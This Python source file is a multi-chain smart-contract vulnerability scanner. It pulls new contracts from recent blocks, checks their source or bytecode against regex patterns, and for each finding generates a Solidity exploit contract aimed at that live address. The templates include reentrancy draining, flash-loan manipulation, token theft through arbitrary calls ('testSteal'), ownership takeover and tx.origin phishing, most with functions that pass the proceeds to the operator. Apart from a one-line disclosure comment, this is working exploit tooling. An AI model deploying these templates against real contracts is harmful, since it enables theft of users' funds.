"""
NanoJS Vulnerability Scanner v3
================================
Handles BOTH verified and unverified contracts:
- Verified: reads full Solidity source from Etherscan
- Unverified: decompiles bytecode via Dedaub API + function
  signature lookup via 4byte.directory

Author: NanoJS Investigations
"""

import os
import re
import json
import time
import logging
import requests
from datetime import datetime
from dotenv import load_dotenv
from web3 import Web3

load_dotenv()
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("nanojs_scanner.log"),
        logging.StreamHandler()
    ]
)
log = logging.getLogger("NanoJS-Scanner-v3")

# ─────────────────────────────────────────────────────────────────────────────
# CHAIN CONFIG
# ─────────────────────────────────────────────────────────────────────────────

CHAINS = {
    "Ethereum": {"chain_id": "1",
        "rpc":      os.getenv("RPC_ETHEREUM", ""),
        "api_url":  "https://api.etherscan.io/v2/api",
        "api_key":  os.getenv("ETHERSCAN_API_KEY", ""),
        "explorer": "https://etherscan.io",
        "native":   "ETH",
    },
    "BSC": {
        "rpc":      os.getenv("RPC_BSC", "https://bsc-dataseed1.binance.org/"),
        "api_url":  "https://api.etherscan.io/v2/api",
        "api_key":  os.getenv("BSCSCAN_API_KEY", ""),
        "explorer": "https://bscscan.com",
        "native":   "BNB",
    },
    "Base": {
        "rpc":      os.getenv("RPC_BASE", ""),
        "api_url":  "https://api.etherscan.io/v2/api",
        "api_key":  os.getenv("BASESCAN_API_KEY", ""),
        "explorer": "https://basescan.org",
        "native":   "ETH",
    },
    "Optimism": {
        "rpc":      os.getenv("RPC_OPTIMISM", ""),
        "api_url":  "https://api.etherscan.io/v2/api",
        "api_key":  os.getenv("OPTIMISM_API_KEY", ""),
        "explorer": "https://optimistic.etherscan.io",
        "native":   "ETH",
    },
    "Arbitrum": {
        "rpc":      os.getenv("RPC_ARBITRUM", ""),
        "api_url":  "https://api.etherscan.io/v2/api",
        "api_key":  os.getenv("ARBISCAN_API_KEY", ""),
        "explorer": "https://arbiscan.io",
        "native":   "ETH",
    },
}

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

# ─────────────────────────────────────────────────────────────────────────────
# VULNERABILITY PATTERNS — SOURCE CODE
# Used for verified contracts with full Solidity source
# ─────────────────────────────────────────────────────────────────────────────

SOURCE_PATTERNS = {
    "REENTRANCY": {
        "name": "Reentrancy Vulnerability",
        "severity": "CRITICAL",
        "description": (
            "External call made before state update. Attacker can "
            "re-enter and drain funds."
        ),
        "required_patterns": [r"\.call\{value"],
        "supporting_patterns": [
            r"balances\[.*\]\s*-=",
            r"balances\[.*\]\s*=\s*0",
            r"userBalance\s*=\s*0",
            r"amount\s*=\s*0",
        ],
        "exclusion_patterns": [
            r"nonReentrant",
            r"ReentrancyGuard",
            r"_status\s*=",
        ],
        "cwe": "CWE-841",
        "reference": "SWC-107",
        "min_confidence": 70,
    },
    "FLASH_LOAN": {
        "name": "Flash Loan Price Oracle Manipulation",
        "severity": "HIGH",
        "description": (
            "Contract uses spot balance for critical pricing. "
            "Manipulable via flash loan."
        ),
        "required_patterns": [r"balanceOf\(address\(this\)\)"],
        "supporting_patterns": [
            r"price\s*=",
            r"getReserves\(\)",
            r"require.*amount.*balance",
        ],
        "exclusion_patterns": [
            r"TWAP", r"twap", r"oracle",
            r"chainlink", r"AggregatorV3",
        ],
        "cwe": "CWE-362",
        "reference": "Flash Loan Oracle Manipulation",
        "min_confidence": 65,
    },
    "ACCESS_CONTROL": {
        "name": "Missing Access Control on Privileged Function",
        "severity": "CRITICAL",
        "description": (
            "Privileged function callable by any address — "
            "missing onlyOwner or role check."
        ),
        "required_patterns": [
            r"function\s+(mint|withdraw|emergencyWithdraw|setOwner|addMinter)\s*\([^)]*\)\s*(public|external)\s*(override\s*)?\{",
        ],
        "supporting_patterns": [
            r"function\s+mint\s*\(",
            r"function\s+withdraw\s*\(",
        ],
        "exclusion_patterns": [
            r"onlyOwner", r"onlyRole", r"onlyMinter",
            r"require.*owner", r"require.*msg\.sender",
            r"_checkOwner", r"whenClaimable", r"whenDepositable",
        ],
        "cwe": "CWE-284",
        "reference": "SWC-105",
        "min_confidence": 75,
    },
    "UNPROTECTED_INIT": {
        "name": "Unprotected Initializer Function",
        "severity": "CRITICAL",
        "description": (
            "initialize() callable by anyone. Attacker can "
            "take ownership of the contract."
        ),
        "required_patterns": [
            r"function\s+initialize\s*\([^)]*\)\s*(public|external)",
        ],
        "supporting_patterns": [r"function\s+initialize\s*\("],
        "exclusion_patterns": [
            r"initializer", r"onlyInitializing",
            r"_disableInitializers", r"reinitializer",
        ],
        "cwe": "CWE-284",
        "reference": "Unprotected Proxy Initializer",
        "min_confidence": 80,
    },
    "TX_ORIGIN": {
        "name": "tx.origin Authentication Bypass",
        "severity": "HIGH",
        "description": (
            "Uses tx.origin for auth. Vulnerable to "
            "phishing attacks via malicious contracts."
        ),
        "required_patterns": [r"tx\.origin\s*=="],
        "supporting_patterns": [
            r"require\s*\(\s*tx\.origin",
            r"tx\.origin\s*!=",
        ],
        "exclusion_patterns": [],
        "cwe": "CWE-290",
        "reference": "SWC-115",
        "min_confidence": 80,
    },
    "SELFDESTRUCT": {
        "name": "Unprotected SELFDESTRUCT",
        "severity": "CRITICAL",
        "description": (
            "selfdestruct() present without sufficient "
            "access control."
        ),
        "required_patterns": [r"selfdestruct\s*\("],
        "supporting_patterns": [r"suicide\s*\("],
        "exclusion_patterns": [
            r"onlyOwner", r"require.*owner",
            r"require.*msg\.sender",
        ],
        "cwe": "CWE-284",
        "reference": "SWC-106",
        "min_confidence": 70,
    },
    "ARBITRARY_CALL": {
        "name": "Arbitrary External Call",
        "severity": "HIGH",
        "description": (
            "Executes call() to arbitrary address with "
            "user-controlled target/data."
        ),
        "required_patterns": [r"\.call\("],
        "supporting_patterns": [
            r"address\(.*\)\.call",
            r"_target\.call",
            r"target\.call",
            r"to\.call",
        ],
        "exclusion_patterns": [
            r"onlyOwner",
            r"require.*whitelist",
            r"require.*approved",
        ],
        "cwe": "CWE-20",
        "reference": "Arbitrary Call Vulnerability",
        "min_confidence": 65,
    },
}

# ─────────────────────────────────────────────────────────────────────────────
# BYTECODE PATTERNS — UNVERIFIED CONTRACTS
# Used when source is not available — based on opcode sequences
# and function selector analysis
# ─────────────────────────────────────────────────────────────────────────────

BYTECODE_PATTERNS = {
    "SELFDESTRUCT_BYTECODE": {
        "name": "SELFDESTRUCT Opcode Detected",
        "severity": "HIGH",
        "description": (
            "Bytecode contains SELFDESTRUCT opcode (0xFF). "
            "Source not verified — cannot confirm access control. "
            "Requires manual review."
        ),
        "opcode": "ff",
        "cwe": "CWE-284",
        "reference": "SWC-106 (Bytecode Detection)",
        "confidence": 50,
        "note": "UNVERIFIED — manual review required",
    },
    "DELEGATECALL_BYTECODE": {
        "name": "DELEGATECALL Opcode Detected",
        "severity": "MEDIUM",
        "description": (
            "Bytecode contains DELEGATECALL opcode (0xF4). "
            "Potential proxy pattern — storage collision risk. "
            "Source not verified."
        ),
        "opcode": "f4",
        "cwe": "CWE-284",
        "reference": "EIP-1967 Proxy Risk (Bytecode Detection)",
        "confidence": 40,
        "note": "UNVERIFIED — manual review required",
    },
}

# Known dangerous function selectors (first 4 bytes of keccak256)
DANGEROUS_SELECTORS = {
    "0x42966c68": "burn(uint256)",
    "0x40c10f19": "mint(address,uint256)",
    "0xa9059cbb": "transfer(address,uint256)",
    "0x2e1a7d4d": "withdraw(uint256)",
    "0xf2fde38b": "transferOwnership(address)",
    "0x715018a6": "renounceOwnership()",
    "0x8da5cb5b": "owner()",
    "0xf3fef3a3": "withdraw(address,uint256)",
    "0x853828b6": "withdrawAll()",
    "0xddc63262": "emergencyWithdraw()",
    "0x4641257d": "harvest()",
    "0xe9fad8ee": "exit()",
    "0x3ccfd60b": "withdraw()",
}

# ─────────────────────────────────────────────────────────────────────────────
# BYTECODE DECOMPILER
# ─────────────────────────────────────────────────────────────────────────────

class BytecodeAnalyser:
    """
    Analyses raw bytecode for dangerous patterns and function selectors.
    Used when source code is not available.
    """

    def extract_function_selectors(self, bytecode: str) -> list[dict]:
        """
        Extract 4-byte function selectors from bytecode and
        look them up in 4byte.directory.
        """
        selectors = []
        # Pattern: PUSH4 <4bytes> followed by EQ (selector comparison)
        # PUSH4 = 0x63, EQ = 0x14
        pattern = r"63([0-9a-f]{8})14"
        matches  = re.findall(pattern, bytecode.lower())

        for sel in set(matches):
            sig = self._lookup_selector(f"0x{sel}")
            selectors.append({
                "selector": f"0x{sel}",
                "signature": sig,
                "dangerous": f"0x{sel}" in DANGEROUS_SELECTORS,
            })

        return selectors

    def _lookup_selector(self, selector: str) -> str:
        """Look up function signature from 4byte.directory."""
        # Check local known selectors first
        if selector in DANGEROUS_SELECTORS:
            return DANGEROUS_SELECTORS[selector]

        # Try 4byte.directory API
        try:
            r = requests.get(
                f"https://www.4byte.directory/api/v1/signatures/?hex_signature={selector}",
                timeout=5
            )
            data = r.json()
            if data.get("results"):
                return data["results"][0]["text_signature"]
        except Exception:
            pass
        return "unknown()"

    def decompile_via_dedaub(self, bytecode: str) -> str | None:
        """
        Submit bytecode to Dedaub decompiler API.
        Returns pseudo-source code or None if unavailable.
        """
        try:
            # Dedaub community decompiler endpoint
            r = requests.post(
                "https://api.dedaub.com/api/decompile",
                json={"bytecode": bytecode},
                timeout=30,
                headers={"Content-Type": "application/json"}
            )
            if r.status_code == 200:
                result = r.json()
                return result.get("decompiled", None)
        except Exception as e:
            log.debug(f"Dedaub decompile failed: {e}")
        return None

    def scan_bytecode(self, bytecode: str) -> list[dict]:
        """Run bytecode-level vulnerability checks."""
        findings = []

        for vuln_id, pattern in BYTECODE_PATTERNS.items():
            if pattern["opcode"] in bytecode.lower():
                findings.append({
                    "vuln_id":     vuln_id,
                    "name":        pattern["name"],
                    "severity":    pattern["severity"],
                    "confidence":  pattern["confidence"],
                    "description": pattern["description"],
                    "evidence":    [
                        f"Opcode 0x{pattern['opcode'].upper()} found in bytecode",
                        f"NOTE: {pattern['note']}"
                    ],
                    "cwe":         pattern["cwe"],
                    "reference":   pattern["reference"],
                    "unverified":  True,
                })

        return findings

    def scan_selectors(self, bytecode: str) -> list[dict]:
        """Check function selectors for dangerous functions."""
        findings  = []
        selectors = self.extract_function_selectors(bytecode)
        dangerous = [s for s in selectors if s["dangerous"]]

        if dangerous:
            sigs = [s["signature"] for s in dangerous]
            findings.append({
                "vuln_id":    "DANGEROUS_FUNCTIONS",
                "name":       "Dangerous Functions Detected (Unverified)",
                "severity":   "MEDIUM",
                "confidence": 45,
                "description": (
                    "Contract exposes potentially dangerous functions. "
                    "Source not verified — manual review required."
                ),
                "evidence": [
                    f"Dangerous selector found: {s['selector']} = {s['signature']}"
                    for s in dangerous
                ],
                "cwe":       "CWE-284",
                "reference": "Function Selector Analysis",
                "unverified": True,
            })

        return findings


# ─────────────────────────────────────────────────────────────────────────────
# SOURCE CODE VULNERABILITY DETECTOR
# ─────────────────────────────────────────────────────────────────────────────

class SourceDetector:

    def scan(self, source: str) -> list[dict]:
        findings = []

        for vuln_id, pattern in SOURCE_PATTERNS.items():
            confidence = 0
            evidence   = []

            # Check exclusions first
            excluded = False
            for excl in pattern["exclusion_patterns"]:
                if re.search(excl, source, re.IGNORECASE):
                    excluded = True
                    break
            if excluded:
                continue

            # Check required patterns
            required_matched = True
            for req in pattern["required_patterns"]:
                matches = re.findall(req, source, re.IGNORECASE | re.MULTILINE)
                if matches:
                    confidence += 40
                    for line_num, line in enumerate(source.split("\n"), 1):
                        if re.search(req, line, re.IGNORECASE):
                            evidence.append(
                                f"Line {line_num}: `{line.strip()[:120]}`"
                            )
                            break
                else:
                    required_matched = False
                    break

            if not required_matched:
                continue

            # Check supporting patterns
            for supp in pattern["supporting_patterns"]:
                if re.search(supp, source, re.IGNORECASE | re.MULTILINE):
                    confidence += 20
                    for line_num, line in enumerate(source.split("\n"), 1):
                        if re.search(supp, line, re.IGNORECASE):
                            evidence.append(
                                f"Line {line_num}: `{line.strip()[:120]}`"
                            )
                            break

            min_conf = pattern.get("min_confidence", 60)
            if confidence >= min_conf and evidence:
                findings.append({
                    "vuln_id":     vuln_id,
                    "name":        pattern["name"],
                    "severity":    pattern["severity"],
                    "confidence":  min(confidence, 95),
                    "description": pattern["description"],
                    "evidence":    evidence,
                    "cwe":         pattern["cwe"],
                    "reference":   pattern["reference"],
                    "unverified":  False,
                })

        findings.sort(key=lambda f: SEVERITY_ORDER.get(f["severity"], 9))
        return findings


# ─────────────────────────────────────────────────────────────────────────────
# CHAIN SCANNER
# ─────────────────────────────────────────────────────────────────────────────

class ChainScanner:
    def __init__(self, chain_name, config):
        self.chain  = chain_name
        self.config = config
        self.w3     = None
        if config["rpc"]:
            w3 = Web3(Web3.HTTPProvider(config["rpc"]))
            if w3.is_connected():
                self.w3 = w3
                log.info(f"[{chain_name}] Connected — block {w3.eth.block_number}")
            else:
                log.warning(f"[{chain_name}] RPC not reachable.")

    def get_recent_contracts(self, max_blocks=50):
        if not self.w3:
            return []
        contracts = []
        latest = self.w3.eth.block_number
        start  = max(0, latest - max_blocks)
        log.info(f"[{self.chain}] Scanning blocks {start}–{latest}...")
        for block_num in range(start, latest + 1):
            try:
                block = self.w3.eth.get_block(block_num, full_transactions=True)
                for tx in block.transactions:
                    if tx.get("to") is None:
                        receipt = self.w3.eth.get_transaction_receipt(tx["hash"])
                        if receipt and receipt.get("contractAddress"):
                            contracts.append({
                                "chain":            self.chain,
                                "contract_address": receipt["contractAddress"],
                                "deployer":         tx["from"],
                                "tx_hash":          tx["hash"].hex(),
                                "block":            block_num,
                                "timestamp":        datetime.utcfromtimestamp(
                                                        block["timestamp"]
                                                    ).strftime("%Y-%m-%d %H:%M UTC"),
                                "explorer_url": f"{self.config['explorer']}/address/{receipt['contractAddress']}",
                            })
            except Exception as e:
                log.debug(f"[{self.chain}] Block {block_num}: {e}")
        log.info(f"[{self.chain}] Found {len(contracts)} contracts.")
        return contracts

    def get_source(self, address):
        """Returns (source, contract_name, compiler) or (None, None, None)."""
        api_key = self.config["api_key"]
        if not api_key:
            return None, None, None
        try:
            r = requests.get(self.config["api_url"], params={
    "chainid": self.config.get("chain_id", "1"),
    "module": "contract", "action": "getsourcecode",
    "address": address, "apikey": api_key,
}, timeout=15)
            data = r.json()
            if data.get("status") == "1" and data["result"]:
                result = data["result"][0]
                source = result.get("SourceCode", "").strip()
                name   = result.get("ContractName", "Unknown")
                ver    = result.get("CompilerVersion", "")
                if source:
                    return source, name, ver
        except Exception as e:
            log.debug(f"Source fetch failed {address}: {e}")
        return None, None, None

    def get_abi(self, address):
        api_key = self.config["api_key"]
        if not api_key:
            return None
        try:
            r = requests.get(self.config["api_url"], params={
                "module": "contract", "action": "getabi",
                "address": address, "apikey": api_key,
            }, timeout=15)
            data = r.json()
            if data.get("status") == "1":
                return json.loads(data["result"])
        except Exception as e:
            log.debug(f"ABI fetch failed {address}: {e}")
        return None

    def get_bytecode(self, address):
        if not self.w3:
            return ""
        try:
            code = self.w3.eth.get_code(Web3.to_checksum_address(address))
            return code.hex()
        except Exception:
            return ""


# ─────────────────────────────────────────────────────────────────────────────
# PoC GENERATOR
# ─────────────────────────────────────────────────────────────────────────────

class PoCGenerator:

    def generate(self, vuln_id, contract, source=None):
        addr  = contract["contract_address"]
        chain = contract["chain"]
        date  = datetime.utcnow().strftime("%Y-%m-%d")

        withdraw_fn = self._find_fn(source,
            ["withdraw","claim","unstake","exit","redeem"]) if source else "withdraw"
        deposit_fn  = self._find_fn(source,
            ["deposit","stake","add"]) if source else "deposit"
        mint_fn     = self._find_fn(source,
            ["mint","mintTo"]) if source else "mint"
        init_fn     = self._find_fn(source,
            ["initialize","init"]) if source else "initialize"

        templates = {
            "REENTRANCY": self._reentrancy(addr, chain, date, withdraw_fn, deposit_fn),
            "ACCESS_CONTROL": self._access_control(addr, chain, date, mint_fn),
            "UNPROTECTED_INIT": self._unprotected_init(addr, chain, date, init_fn),
            "SELFDESTRUCT": self._selfdestruct(addr, chain, date),
            "SELFDESTRUCT_BYTECODE": self._selfdestruct(addr, chain, date),
            "TX_ORIGIN": self._txorigin(addr, chain, date),
            "FLASH_LOAN": self._flashloan(addr, chain, date),
            "ARBITRARY_CALL": self._arbitrary_call(addr, chain, date),
            "DANGEROUS_FUNCTIONS": self._dangerous_functions(addr, chain, date),
        }
        return templates.get(vuln_id)

    def _find_fn(self, source, candidates):
        if not source:
            return candidates[0]
        for name in candidates:
            m = re.search(rf"function\s+({name}\w*)\s*\(", source, re.IGNORECASE)
            if m:
                return m.group(1)
        return candidates[0]

    def _reentrancy(self, addr, chain, date, withdraw_fn, deposit_fn):
        deposit_line = (f"target.{deposit_fn}{{value: msg.value}}();"
                        if deposit_fn else "// fund target manually first")
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Reentrancy | Target: {addr} | Chain: {chain} | {date}
// DISCLAIMER: Responsible disclosure only.
interface ITarget {{
    function {withdraw_fn}(uint256 amount) external;
    {"function " + deposit_fn + "() external payable;" if deposit_fn else ""}
}}
contract NanoJS_ReentrancyPoC {{
    ITarget public target;
    address public owner;
    uint256 public attackAmount;
    uint256 private callCount;
    event AttackResult(uint256 drained, uint256 calls);
    constructor(address _target) {{ target = ITarget(_target); owner = msg.sender; }}
    function attack() external payable {{
        require(msg.sender == owner);
        attackAmount = msg.value; callCount = 0;
        {deposit_line}
        target.{withdraw_fn}(attackAmount);
        emit AttackResult(address(this).balance, callCount);
    }}
    receive() external payable {{
        callCount++;
        if (callCount < 5 && address(target).balance >= attackAmount)
            target.{withdraw_fn}(attackAmount);
    }}
    function collect() external {{
        require(msg.sender == owner);
        (bool ok,) = owner.call{{value: address(this).balance}}(""); require(ok);
    }}
}}'''

    def _access_control(self, addr, chain, date, mint_fn):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Missing Access Control | Target: {addr} | Chain: {chain} | {date}
interface ITarget {{
    function {mint_fn}(address to, uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
}}
contract NanoJS_AccessControlPoC {{
    ITarget public target; address public owner;
    event Result(bool success, uint256 before, uint256 after_);
    constructor(address _t) {{ target = ITarget(_t); owner = msg.sender; }}
    function testMint(uint256 amount) external {{
        require(msg.sender == owner);
        uint256 b = target.balanceOf(address(this));
        try target.{mint_fn}(address(this), amount) {{
            emit Result(true, b, target.balanceOf(address(this)));
        }} catch {{ emit Result(false, b, b); }}
    }}
}}'''

    def _unprotected_init(self, addr, chain, date, init_fn):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Unprotected Initializer | Target: {addr} | Chain: {chain} | {date}
interface ITarget {{
    function {init_fn}(address owner) external;
    function owner() external view returns (address);
}}
contract NanoJS_InitPoC {{
    ITarget public target; address public owner;
    event Result(bool tookOwnership, address newOwner);
    constructor(address _t) {{ target = ITarget(_t); owner = msg.sender; }}
    function testReinit() external {{
        require(msg.sender == owner);
        try target.{init_fn}(address(this)) {{
            emit Result(target.owner() == address(this), target.owner());
        }} catch {{ emit Result(false, address(0)); }}
    }}
}}'''

    def _selfdestruct(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — SELFDESTRUCT | Target: {addr} | Chain: {chain} | {date}
interface ITarget {{ function destroy() external; }}
contract NanoJS_SelfDestructPoC {{
    ITarget public target; address public owner;
    event Result(bool ok, uint256 balBefore);
    constructor(address _t) {{ target = ITarget(_t); owner = msg.sender; }}
    function test() external {{
        require(msg.sender == owner);
        uint256 bal = address(target).balance;
        try target.destroy() {{ emit Result(true, bal); }}
        catch {{ emit Result(false, bal); }}
    }}
    receive() external payable {{}}
}}'''

    def _txorigin(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — tx.origin Bypass | Target: {addr} | Chain: {chain} | {date}
interface ITarget {{ function withdraw(uint256 amount) external; }}
contract NanoJS_TxOriginPoC {{
    ITarget public target; address public attacker;
    constructor(address _t) {{ target = ITarget(_t); attacker = msg.sender; }}
    // Owner calls this — tx.origin = owner, msg.sender = this contract
    function trickedCall(uint256 amount) external {{ target.withdraw(amount); }}
    receive() external payable {{
        (bool ok,) = attacker.call{{value: address(this).balance}}(""); require(ok);
    }}
}}'''

    def _flashloan(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Flash Loan | Target: {addr} | Chain: {chain} | {date}
interface ILender {{ function flashLoan(address,address,uint256,bytes calldata) external; }}
interface ITarget {{ function vulnerableFunction(uint256) external; }}
interface IERC20 {{
    function approve(address,uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function transfer(address,uint256) external returns (bool);
}}
contract NanoJS_FlashLoanPoC {{
    address public owner; ILender lender; ITarget target; IERC20 token;
    constructor(address _l, address _t, address _tk) {{
        owner=msg.sender; lender=ILender(_l); target=ITarget(_t); token=IERC20(_tk);
    }}
    function attack(uint256 amount) external {{
        require(msg.sender==owner);
        lender.flashLoan(address(this), address(token), amount, abi.encode(amount));
    }}
    function executeOperation(address,uint256 amount,uint256 premium,address,bytes calldata)
        external returns (bool) {{
        token.approve(address(target), type(uint256).max);
        target.vulnerableFunction(amount);
        token.approve(msg.sender, amount + premium);
        return true;
    }}
    function collect() external {{
        require(msg.sender==owner);
        token.transfer(owner, token.balanceOf(address(this)));
    }}
}}'''

    def _arbitrary_call(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Arbitrary Call | Target: {addr} | Chain: {chain} | {date}
interface ITarget {{ function execute(address target, bytes calldata data) external; }}
interface IERC20 {{
    function transferFrom(address,address,uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}}
contract NanoJS_ArbitraryCallPoC {{
    address public owner; ITarget public target;
    constructor(address _t) {{ owner=msg.sender; target=ITarget(_t); }}
    function testSteal(address token, uint256 amount) external {{
        require(msg.sender==owner);
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", address(this), amount);
        target.execute(token, data);
        IERC20(token).transferFrom(address(target), owner,
            IERC20(token).balanceOf(address(target)));
    }}
}}'''

    def _dangerous_functions(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Dangerous Functions (Unverified Contract)
// Target: {addr} | Chain: {chain} | {date}
// NOTE: Source unverified. Adjust interface to match actual ABI.
interface ITarget {{
    function withdraw() external;
    function emergencyWithdraw() external;
    function mint(address to, uint256 amount) external;
}}
contract NanoJS_DangerousFnPoC {{
    ITarget public target; address public owner;
    event Result(string fn, bool success);
    constructor(address _t) {{ target = ITarget(_t); owner = msg.sender; }}
    function testWithdraw() external {{
        require(msg.sender==owner);
        try target.withdraw() {{ emit Result("withdraw", true); }}
        catch {{ emit Result("withdraw", false); }}
    }}
    function testEmergencyWithdraw() external {{
        require(msg.sender==owner);
        try target.emergencyWithdraw() {{ emit Result("emergencyWithdraw", true); }}
        catch {{ emit Result("emergencyWithdraw", false); }}
    }}
    receive() external payable {{}}
}}'''


# ─────────────────────────────────────────────────────────────────────────────
# MAIN SCAN RUNNER
# ─────────────────────────────────────────────────────────────────────────────

def run_scan(target_address=None, chain_name="Ethereum",
             scan_recent=False, max_blocks=50):

    source_detector  = SourceDetector()
    bytecode_analyser = BytecodeAnalyser()
    poc_gen           = PoCGenerator()
    all_results       = []

    chains_to_scan = (
        {chain_name: CHAINS[chain_name]} if chain_name in CHAINS else CHAINS
    )

    for cname, cfg in chains_to_scan.items():
        scanner   = ChainScanner(cname, cfg)
        contracts = []

        if target_address:
            contracts = [{
                "chain":            cname,
                "contract_address": target_address,
                "deployer":         "N/A",
                "tx_hash":          "N/A",
                "block":            "N/A",
                "timestamp":        datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"),
                "explorer_url":     f"{cfg['explorer']}/address/{target_address}",
            }]
        elif scan_recent:
            contracts = scanner.get_recent_contracts(max_blocks=max_blocks)

        for contract in contracts:
            addr = contract["contract_address"]
            log.info(f"[{cname}] Scanning {addr}...")

            findings = []
            pocs     = {}
            source_available = False

            # ── PATH 1: Try to get verified source code ────────────────────
            source, contract_name, compiler = scanner.get_source(addr)

            if source:
                # Full source available — run source-level detection
                source_available = True
                contract["contract_name"] = contract_name
                contract["compiler"]      = compiler
                log.info(f"[{cname}] ✓ Verified: {contract_name} ({compiler})")

                findings = source_detector.scan(source)

                # Generate accurate PoCs from real function names
                for f in findings:
                    poc = poc_gen.generate(f["vuln_id"], contract, source)
                    if poc:
                        pocs[f["vuln_id"]] = poc

            else:
                # ── PATH 2: No source — analyse bytecode ───────────────────
                contract["contract_name"] = "Unverified"
                contract["compiler"]      = "Unknown"
                log.info(f"[{cname}] ⚠ Unverified — analysing bytecode...")

                bytecode = scanner.get_bytecode(addr)

                if not bytecode or bytecode == "0x":
                    log.info(f"[{cname}] Empty bytecode — skipping.")
                    continue

                # Try Dedaub decompilation first
                decompiled = bytecode_analyser.decompile_via_dedaub(bytecode)
                if decompiled:
                    log.info(f"[{cname}] Decompiled via Dedaub — running source scan.")
                    contract["contract_name"] = "Decompiled"
                    findings = source_detector.scan(decompiled)
                    source   = decompiled
                    source_available = True
                else:
                    # Fall back to bytecode + selector analysis
                    log.info(f"[{cname}] Using bytecode + selector analysis.")
                    findings  = bytecode_analyser.scan_bytecode(bytecode)
                    findings += bytecode_analyser.scan_selectors(bytecode)

                # Generate PoCs (generic for unverified)
                for f in findings:
                    poc = poc_gen.generate(f["vuln_id"], contract,
                                           source if source_available else None)
                    if poc:
                        pocs[f["vuln_id"]] = poc

            if findings:
                log.warning(
                    f"[{cname}] {len(findings)} finding(s) at {addr} "
                    f"({'verified' if source_available else 'unverified'})"
                )
                all_results.append({
                    "contract":         contract,
                    "findings":         findings,
                    "pocs":             pocs,
                    "source_available": source_available,
                    "abi_available":    scanner.get_abi(addr) is not None,
                    "bytecode_snippet": "",
                })
            else:
                log.info(f"[{cname}] No vulnerabilities found at {addr}.")

    return all_results


if __name__ == "__main__":
    import sys
    if len(sys.argv) >= 2:
        address = sys.argv[1]
        chain   = sys.argv[2] if len(sys.argv) >= 3 else "Ethereum"
        results = run_scan(target_address=address, chain_name=chain)
    else:
        results = run_scan(scan_recent=True, max_blocks=20)

    if results:
        with open("scan_results.json", "w") as f:
            json.dump(results, f, indent=2, default=str)
        log.info(f"Done. {len(results)} contract(s) flagged.")
        log.info("Run: python3 report_generator.py")
    else:
        log.info("No vulnerabilities found.")
